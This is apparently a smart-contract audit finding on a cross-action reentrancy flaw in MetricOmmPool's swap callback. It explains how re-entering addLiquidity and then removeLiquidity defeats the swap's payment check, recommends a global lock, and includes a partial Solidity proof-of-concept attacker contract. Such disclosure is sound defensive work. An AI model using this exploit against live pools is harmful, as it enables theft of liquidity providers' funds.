### Title
Cross-Action Reentrancy in `swap()` Callback Allows Balance Inflation to Bypass Payment Check — (File: metric-core/contracts/MetricOmmPool.sol)

### Summary
`MetricOmmPool` uses a per-action reentrancy guard (`nonReentrant(PoolActions.X)`). During the `metricOmmSwapCallback` inside `swap()` — which holds the `PoolActions.SWAP` lock — an attacker can re-enter via `addLiquidity()`, which acquires the distinct `PoolActions.ADD_LIQUIDITY` lock. This inflates the pool's token balance before the swap's post-callback balance check executes, allowing the attacker to satisfy the check without actually paying for the swap. The attacker then removes the liquidity position to recover the tokens used to inflate the balance, netting the swap output for free.

### Finding Description
`swap()` is guarded by `nonReentrant(PoolActions.SWAP)`. After executing the swap math and transferring the output token to the recipient, it records `balance0Before`, then calls `metricOmmSwapCallback` on `msg.sender`, and finally checks that the balance increased by at least `amount0Delta`:

```solidity
uint256 balance0Before = balance0();
IMetricOmmSwapCallback(msg.sender).metricOmmSwapCallback(amount0Delta, amount1Delta, callbackData);
if (amount0Delta > 0 && balance0Before + uint256(amount0Delta) > balance0()) {
    revert IncorrectDelta();
}
```

`addLiquidity()` is guarded by the separate `nonReentrant(PoolActions.ADD_LIQUIDITY)` lock. Because the guard is keyed per-action, calling `addLiquidity()` from inside the swap callback does not trigger the reentrancy revert. The attacker's `addLiquidity()` call deposits token0 into the pool, raising `balance0()` above `balance0Before + amount0Delta`, causing the swap's balance check to pass. The attacker then calls `removeLiquidity()` (guarded by yet another distinct lock, `PoolActions.REMOVE_LIQUIDITY`) to recover the deposited tokens, leaving the pool short the swap's required token0 input.

The per-action nature of the guard is confirmed by `inSwap()`, which calls `_currentAction() == PoolActions.SWAP` — the guard tracks which specific action is active, not whether any action is active.

### Impact Explanation
An attacker receives the full swap output (token1) without paying the required swap input (token0). The pool's `binTotals.scaledToken0` is decremented by the swap but never replenished, making the pool insolvent with respect to LP claims. Repeated attacks drain the pool of one token entirely. This is a direct loss of LP principal — Critical severity.

### Likelihood Explanation
Any address that can call `swap()` with a non-zero `callbackData` can trigger this. No special role or privileged setup is required. The attacker only needs to hold enough token0 to temporarily fund the `addLiquidity()` call (recovered immediately via `removeLiquidity()`). The attack is atomic within a single transaction.

### Recommendation
Replace the per-action `nonReentrant(PoolActions.X)` guard with a **global** reentrancy lock that blocks all pool entry while any action is in progress. Alternatively, add an explicit cross-action lock that prevents `addLiquidity`, `removeLiquidity`, and `swap` from being entered while any of the three is already executing. The `inSwap()` view function can be preserved as a read-only state query without affecting the guard.

### Proof of Concept
```solidity
contract Attacker {
    MetricOmmPool pool;
    IERC20 token0;
    IERC20 token1;
    uint256 swapAmount0;

    function attack() external {
        // Step 1: initiate swap — pool will send token1 out, then call us back
        pool.swap(address(this), true, int128(int256(swapAmount0)), 0, abi.encode("attack"), "");
    }

    // Step 2: swap callback — called inside PoolActions.SWAP lock
    function metricOmmSwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        // Re-enter via addLiquidity — uses PoolActions.ADD_LIQUIDITY lock, NOT blocked
        LiquidityDelta memory delta = /* bins covering current price, shares = swapAmount0 worth */;
        pool.addLiquidity(address(this), 0, delta, abi.encode("liq"), "");
        // pool.balance0() is now balance0Before + liquidityToken0 >= balance0Before + amount0Delta
        // swap's IncorrectDelta check passes without us paying for the swap
    }

    // Step 3: addLiquidity callback — pay token0 into pool (temporarily)
    function metricOmmLiquidityCallback(uint256 amount0, uint256 amount1, bytes calldata) external {
        token0.transfer(address(pool), amount0); // real payment for liquidity
    }

    function recover() external {
        // Step 4: remove liquidity — uses PoolActions.REMOVE_LIQUIDITY lock, not blocked
        LiquidityDelta memory delta = /* same position */;
        pool.removeLiquidity(address(this), 0, delta, "");
        // Recover token0 paid in step 3; net gain = token1 received in step 1
    }
}
```

After `attack()` + `recover()`: attacker holds the full token1 swap output; pool's `binTotals.scaledToken0` is permanently reduced by `amount0Delta` with no corresponding token0 received.